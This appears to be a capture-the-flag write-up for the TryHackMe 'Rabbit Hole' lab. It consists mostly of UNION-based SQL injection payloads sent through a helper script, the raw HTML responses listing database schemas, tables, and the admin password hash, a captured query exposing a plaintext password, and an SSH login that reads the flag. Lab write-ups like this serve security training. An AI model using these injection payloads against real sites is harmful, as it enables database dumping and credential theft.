---
tags:
title: Rabbit Hole - Hard (THM)
permalink: /RabbitHole-THM-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 

```

![[Pasted image 20260320151343.png]]

![[Pasted image 20260320151452.png]]

![[Pasted image 20260320151821.png]]

![[Pasted image 20260320152620.png]]

```bash
" UNION SELECT 1,2-- -
```

![[Pasted image 20260320152925.png]]

```BASH
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, schema_name FROM information_schema.schemata-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:40</td></tr>
<tr><td>2026-03-20 18:39</td></tr>
<tr><td>2026-03-20 18:38</td></tr>
<tr><td>2026-03-20 18:37</td></tr>
<tr><td>2026-03-20 18:36</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2032 - "UNION SELECT 1, schema_name FROM information_schema.schemata-- - last logins</th></thead><tbody>
<tr><td>information_sche</td></tr>
<tr><td>web</td></tr>
</tbody></table>
</div></div></div>
```

```bash
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema="web"-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:43</td></tr>
<tr><td>2026-03-20 18:42</td></tr>
<tr><td>2026-03-20 18:41</td></tr>
<tr><td>2026-03-20 18:40</td></tr>
<tr><td>2026-03-20 18:39</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2035 - "UNION SELECT 1, table_name FROM information_schema.tables WHERE table_schema="web"-- - last logins</th></thead><tbody>
<tr><td>users</td></tr>
<tr><td>logins</td></tr>
</tbody></table>
</div></div></div>
```

```bash
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="users"-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:44</td></tr>
<tr><td>2026-03-20 18:43</td></tr>
<tr><td>2026-03-20 18:42</td></tr>
<tr><td>2026-03-20 18:41</td></tr>
<tr><td>2026-03-20 18:40</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2036 - "UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name="users"-- - last logins</th></thead><tbody>
<tr><td>id</td></tr>
<tr><td>username</td></tr>
<tr><td>password</td></tr>
<tr><td>group</td></tr>
</tbody></table>
</div></div></div>
```

```bash
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, GROUP_CONCAT(username, 0x3a, password) FROM users-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:46</td></tr>
<tr><td>2026-03-20 18:45</td></tr>
<tr><td>2026-03-20 18:44</td></tr>
<tr><td>2026-03-20 18:43</td></tr>
<tr><td>2026-03-20 18:42</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2039 - "UNION SELECT 1, GROUP_CONCAT(username, 0x3a, password) FROM users-- - last logins</th></thead><tbody>
<tr><td>admin:0e3ab8e45a</td></tr>
</tbody></table>
</div></div></div>
```

primera mitad

```bash
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, password FROM users WHERE username="admin"-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:48</td></tr>
<tr><td>2026-03-20 18:47</td></tr>
<tr><td>2026-03-20 18:46</td></tr>
<tr><td>2026-03-20 18:45</td></tr>
<tr><td>2026-03-20 18:44</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2040 - "UNION SELECT 1, password FROM users WHERE username="admin"-- - last logins</th></thead><tbody>
<tr><td>0e3ab8e45ac1163c</td></tr>
</tbody></table>
</div></div></div>
```

segunda mitad

```bashg
zs1n@ptw ~> python3 sqli.py 'http://10.65.136.134/' '"UNION SELECT 1, SUBSTR(password, 17, 16) FROM users WHERE username="admin"-- -'

<!DOCTYPE html>
<html lang="en">
<head>

  <meta charset="utf-8">
  <title>Your page title here :)</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <link rel="stylesheet" href="css/normalize.css">
  <link rel="stylesheet" href="css/skeleton.css">


</head>
<body>

    <div class="container"><div class="row"><div class="one-half column" style="margin-top: 25%"><div><h4>Last logins</h4></div><div><a href="/logout.php">Logout</a></div>
<table class="u-full-width">
<thead><th>User 1 - admin last logins</th></thead><tbody>
<tr><td>2026-03-20 18:52</td></tr>
<tr><td>2026-03-20 18:51</td></tr>
<tr><td>2026-03-20 18:50</td></tr>
<tr><td>2026-03-20 18:49</td></tr>
<tr><td>2026-03-20 18:48</td></tr>
</tbody></table>
<table class="u-full-width">
<thead><th>User 2044 - "UNION SELECT 1, SUBSTR(password, 17, 16) FROM users WHERE username="admin"-- - last logins</th></thead><tbody>
<tr><td>2343990e427c66ff</td></tr>
</tbody></table>
</div></div></div>
```

```bash
zs1n@ptw ~> python3 sq.py 'http://10.65.136.134/'
SELECT * from users where (username= 'admin' and password=md5('fEeFBqOXBOLmjpTt0B3LNpuwlr7mJxI9dR8kgTpbOQcLlvgmoCt35qogicf8ao0Q') ) UNION ALL SELECT null,null,null,SLEEP(5) LIMIT 2

zs1n@ptw ~> ssh admin@10.165.136.134
ssh: connect to host 10.165.136.134 port 22: Connection refused

zs1n@ptw ~> RabbitHole ssh admin@10.65.136.134                                                                                                                          21s
zs1n@ptw ~> ssh admin@10.65.136.134
The authenticity of host '10.65.136.134 (10.65.136.134)' can't be established.
ED25519 key fingerprint is: SHA256:Isaoxan2d+XFoXmwu4RWDMAjr+A4MZGLPoacIxv/gSc
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.136.134' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
admin@10.65.136.134's password:
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

admin@ubuntu-jammy:~$ cat flag.txt
THM{this_is_the_way_step_inside_jNu8uJ9tvKfH1n48}
```